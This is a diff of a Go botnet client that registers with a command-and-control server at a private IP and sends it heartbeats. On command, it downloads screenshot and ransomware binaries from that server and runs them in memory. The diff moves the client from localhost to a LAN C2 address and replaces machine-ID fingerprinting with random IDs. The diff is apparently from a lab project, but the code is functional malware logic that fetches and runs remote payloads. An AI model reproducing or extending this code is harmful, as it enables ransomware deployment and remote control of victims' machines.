@@ -5,19 +5,15 @@ import (
 	"encoding/json"
 	"fmt"
 	"github.com/amenzhinsky/go-memexec"
-	"golang.org/x/sys/windows/registry"
-	"os"
-	"path/filepath"
-	"runtime"
-	//"io"
+	"github.com/rs/xid"
 	"io/ioutil"
 	"log"
 	"net/http"
-	//"os"
-	//"os/exec"
+	"os"
+	"path/filepath"
+	"runtime"
 	"strings"
 	"time"
-	//"unicode"
 )
 
 type bot struct {
@@ -34,36 +30,13 @@ func getTime() string {
 	return currentTime.Format(time.RFC850)
 }
 
-func getmachineid() string {
-	var id string
-	if opersys == "windows" {
-		k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\SQMClient`, registry.QUERY_VALUE)
-		if err != nil {
-			log.Fatal(err)
-		}
-		defer k.Close()
-
-		s, _, err := k.GetStringValue("MachineId")
-		s2 := strings.Trim(s, "{}")
-		res1 := strings.Split(s2, "-")
-		id = res1[len(res1)-1]
-		if err != nil {
-			log.Fatal(err)
-		}
-	} else if opersys == "linux" {
-		data, err := ioutil.ReadFile("/etc/machine-id")
-		if err != nil {
-			panic(err)
-		}
-		id = string(data)
-	} else {
-		fmt.Println("unsupported OS")
-		os.Exit(1)
-	}
+func getid() string {
+	guid := xid.New()
+	id := guid.String()
 	return id
 }
 
-var idnum = getmachineid()
+var idnum = getid()
 
 func register() {
 
@@ -79,16 +52,7 @@ func register() {
 	var resp *http.Response
 	var err error
 
-	switch opersys {
-	case "windows":
-		resp, err = http.Post("http://localhost:8081/register", "application/json", bytes.NewBuffer(postBody))
-	case "linux":
-		resp, err = http.Post("http://127.0.1.1:8081/register", "application/json", bytes.NewBuffer(postBody))
-	case "default":
-		fmt.Println("OS unsupported")
-		os.Exit(1)
-	}
-
+	resp, err = http.Post("http://192.168.121.128:8081/register", "application/json", bytes.NewBuffer(postBody))
 	//Handle Error
 	if err != nil {
 		fmt.Printf("An Error Occured %v\n", err)
@@ -112,15 +76,7 @@ func heartbeat() {
 	postBody, _ := json.Marshal(b)
 	var resp *http.Response
 	var err error
-	switch opersys {
-	case "windows":
-		resp, err = http.Post("http://localhost:8081/heartbeat", "application/json", bytes.NewBuffer(postBody))
-	case "linux":
-		resp, err = http.Post("http://127.0.1.1:8081/heartbeat", "application/json", bytes.NewBuffer(postBody))
-	case "default":
-		fmt.Println("OS unsupported")
-		os.Exit(1)
-	}
+	resp, err = http.Post("http://192.168.121.128:8081/heartbeat", "application/json", bytes.NewBuffer(postBody))
 
 	//Handle Error
 	if err != nil {
@@ -148,9 +104,9 @@ func execmod(cmdrsp string) {
 	if cmdrsp == "screenshot" {
 		switch opersys {
 		case "windows":
-			resp, err = http.Get("http://localhost:8081/screen")
+			resp, err = http.Get("http://192.168.121.128:8081/screen-windows.exe")
 		case "linux":
-			resp, err = http.Get("http://127.0.1.1:8081/screen")
+			resp, err = http.Get("http://192.168.121.128:8081/screen-linux")
 		case "default":
 			fmt.Println("OS unsupported")
 			os.Exit(1)
@@ -190,9 +146,9 @@ func execmod(cmdrsp string) {
 
 		switch opersys {
 		case "windows":
-			resp, err = http.Get("http://localhost:8081/ransomware")
+			resp, err = http.Get("http://192.168.121.128:8081/ransomware-windows.exe")
 		case "linux":
-			resp, err = http.Get("http://127.0.1.1:8081/ransomware")
+			resp, err = http.Get("http://192.168.121.128:8081/ransomware-linux")
 		case "default":
 			fmt.Println("OS unsupported")
 			os.Exit(1)
@@ -228,8 +184,7 @@ func execmod(cmdrsp string) {
 func deletefiles(path string, f os.FileInfo, err error) (e error) {
 
 	// check each file if starts with the idnum
-	prefix := idnum + "_"
-	if strings.HasPrefix(f.Name(), prefix) {
+	if strings.HasPrefix(f.Name(), idnum) {
 		os.Remove(path)
 	}
 	return
